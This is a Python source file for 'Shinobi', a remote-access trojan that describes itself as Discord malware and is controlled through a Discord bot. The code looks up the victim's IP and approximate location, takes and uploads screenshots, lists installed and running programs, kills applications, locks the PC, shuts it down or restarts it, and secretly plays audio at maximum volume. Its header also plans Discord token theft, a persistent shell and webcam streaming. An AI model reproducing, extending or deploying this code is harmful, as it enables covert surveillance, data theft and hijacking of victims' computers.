'''
    # Project: Shinobi

        - Your average Discord Malware

        Functions:

            - Get user location and IP
            - Close any open application on victim
            - Lock/Shutdown/restart victim's PC
            - Can Display our banner to the victim's PC
            - Can get info about victim's PC

        Future Functions:
            - Can open victim's discord thru the stolen TOKEN
            - wreck their Discord account
            - gain a shell and persistent shell to the victim
            - stream victim's webcam

'''

# for file and operating system pkg
import os
import shutil
import sys
import re
import platform  # PKG to get user info
import subprocess

if os.name != "nt":
    exit()

# Discord Pkg
import discord
from discord.utils import get
from discord.ext import commands


import time
import mss
# from mss import mss  # for screenshoting victim screen
# web requesting
import requests
import urllib.request
from urllib.request import urlopen, urlretrieve
from requests import get #Request to web for data Public IP getter

# for Audio and Hardware like keyboard and mouse
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import ctypes
from comtypes import CLSCTX_ALL


# for running program in background
import win32process
import win32con
import win32gui
import winreg

# get user current location
import geocoder

# PKG for streaming screen of the victim
import socket
import cv2
import pickle
import struct
import imutils
import numpy


client = commands.Bot(command_prefix='!')
bot_token = str(sys.argv[1])

count = 0
keys = []
timer = 0


# get IP of the victim
victim_ip = get('https://api.ipify.org').text

def MaxVolume():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
    if volume.GetMute() == 1:
        volume.SetMute(0, None)
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)


# Function when out Bot is alive
@client.event
async def on_ready():
    report_channel = client.get_channel(int(sys.argv[2]))
    time.sleep(2)
    pin_msg = await report_channel.send('!show_cmd')
    pin_msg.pin()
    # sending message to report
    myEmbed = discord.Embed(title="Shinobi is Online at this address {}".format(victim_ip), color=0xc40e0e)
    myEmbed.add_field(name="** **",value="Send '!show_cmd' to the designated channel know what I'm capable of ")
    # myEmbed.set_thumbnail(url='https://i.pinimg.com/originals/31/a4/94/31a494b737822b7f2ad1b550da18a00e.jpg')

    await report_channel.send(embed=myEmbed)
    # time.sleep(3)



#Show Capable CMD
@client.command()
async def show_cmd(message):

    my_embed = discord.Embed(title="Commands",
                             description="Every command has a description on it. \n If it has a ' [] ' meaning you need to fill or put a parameter to it",
                             inline=False,color=16705372)
    my_embed.add_field(name='!lock_user ', value='Lock user from their PC', inline=True)
    my_embed.add_field(name='!shut_down_user  [duration] ', value='Lock user from their PC with given duration', inline=True)
    my_embed.add_field(name='!restart_user  [duration] ', value='Restart user PC with given duration', inline=True)
    my_embed.add_field(name='!info ', value='Display victim pc info', inline=True)
    my_embed.add_field(name='!screenshot ', value='Grabbing a screenshot of the victim screen', inline=True)
    my_embed.add_field(name='!get_location ', value='Get victim location (not the accurate like their exact house but high probability that its their place)', inline=True)
    my_embed.add_field(name='!check_open_app ', value='Display open apps in victim PC', inline=True)
    my_embed.add_field(name='!close_app [Name of application] ', value='terminate chosen app', inline=True)
    my_embed.add_field(name='!list_app ', value='Display apps from C drive', inline=True)
    my_embed.add_field(name='!delete', value='Delete whole server convo', inline=True)
    my_embed.add_field(name='!rest', value='ShutDown Discord Bot', inline=True)

    await message.send(embed=my_embed)

# Lock Victim from computer
@client.command()
async def lock_user(message):
    await message.send('Locking user now')
    time.sleep(1)
    ctypes.windll.user32.LockWorkStation()

# Shutting Down Victim PC
@client.command()
async def shut_down_user(message, duration: str):
    await message.send('Shutting Down Victim PC this long {}'.format(duration))
    time.sleep(2)
    os.system("shutdown /s /t {}".format(duration))

# Restart Victim PC
@client.command()
async def restart_user(message, duration: str):
    await message.send('Restarting Victim PC this long {}'.format(duration))
    time.sleep(2)
    os.system("shutdown /r /t {}".format(duration))


# get user info
@client.command()
async def info(message):
    # Reporting User info
    myEmbed = discord.Embed(title=" Victim's Info", color=0xc40e0e)

    myEmbed.add_field(name='Running Machine: ', value=platform.machine(), inline=True)
    myEmbed.add_field(name='Machine Version: ', value=platform.version(), inline=True)
    myEmbed.add_field(name='Machine System: ', value=platform.system(), inline=True)
    myEmbed.add_field(name='Hostname: ', value=platform.node(), inline=True)
    myEmbed.add_field(name="Victim's IP: ", value=victim_ip, inline=True)
    # myEmbed.add_field(name="Victim's IP: ", value=victim_ip, inline=True)

    await message.send(embed=myEmbed)

# grab screenshot of Victim
@client.command()
async def screenshot(message):
    await message.send("I got you my guy")
    time.sleep(2)
    temp = os.path.join(os.getenv('TEMP') + "\\monitor.png")
    with mss.mss() as sct:
        sct.shot(output=temp)
        file = discord.File(temp, filename="monitor.png")
        await message.send("Here's the screenshot", file=file)
        os.remove(temp)
    # await message.send("Ehh pass")

# get victim current location
@client.command()
async def get_location(message):
    await message.send(file=discord.File('8316-wicked-leave.png'))
    time.sleep(2)
    await message.send('getting user current location now')
    time.sleep(1)

    vic_location = geocoder.ip(victim_ip)

    myEmbed = discord.Embed(title=" Victim's Location",description="not exactly location of their home but high chance it's their place", color=0xc40e0e)

    myEmbed.add_field(name='Victim Location: ', value=vic_location, inline=False)
    myEmbed.add_field(name='Latitude and Longitude: ', value=vic_location.latlng, inline=False)

    await message.send(embed=myEmbed)

# Check what app is running
@client.command()
async def check_open_app(message):
    await message.send('reviewing open apps')
    time.sleep(2)
    cmd = 'powershell "gps | where {$_.MainWindowTitle } | select ProcessName,Id'
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    result = []
    for line in proc.stdout:
        if line.rstrip():
            # only print lines that are not empty
            # decode() is necessary to get rid of the binary string (b')
            # rstrip() to remove `\r\n`
            await message.send(line.decode().rstrip())


# Close running apps
@client.command()
async def close_app(message, app: str):
    os.system(" taskkill /f /im {}.exe".format(app))
    time.sleep(2)
    await message.send(f'{app} is now closed LEZGOOOO')


# list all installed application
@client.command()
async def list_app(message):
    # var = os.system('C:\Program Files (x86)')

    await message.send("This is the list in C drive")
    time.sleep(2)
    await message.send(os.listdir('C:\Program Files (x86)'))
    await message.send("This is the list in D drive")
    time.sleep(2)
    try:
        await message.send(os.listdir('D:\\'))
    except:
        await message.send(os.listdir('C:\\'))


# Play BG music
@client.command()
async def bg_music(message, youtube_link: str):
    MaxVolume()
    if re.match(r'^(?:http|ftp)s?://', youtube_link) is not None:
            await message.send(f"Playing `{youtube_link}` on **{os.getlogin()}'s** computer")
            os.system(f'start {youtube_link}')
            while True:
                def get_all_hwnd(hwnd, mouse):
                    def winEnumHandler(hwnd, message):
                        if win32gui.IsWindowVisible(hwnd):
                            if "youtube" in (win32gui.GetWindowText(hwnd).lower()):
                                win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
                                global pid_process
                                pid_process = win32process.GetWindowThreadProcessId(hwnd)
                                return "ok"
                            else:
                                pass

                    if win32gui.IsWindow(hwnd) and win32gui.IsWindowEnabled(hwnd) and win32gui.IsWindowVisible(hwnd):
                        win32gui.EnumWindows(winEnumHandler,None)
                try:
                    win32gui.EnumWindows(get_all_hwnd, 0)
                except:
                    break
    else:
        await message.send("Invalid Youtube Link")


# Stop BG music
@client.command()
async def stop_bg(message):
    await message.send("stopped the music")
    os.system(f"taskkill /F /IM {pid_process[1]}")

# delete message
@client.command()
async def delete(message,amount = 66):
     await message.channel.purge(limit=amount)

# give bot a rest
@client.command()
async def rest(message):
    await message.send("We're going offline now")
    time.sleep(2)
    exit()


client.run(bot_token)
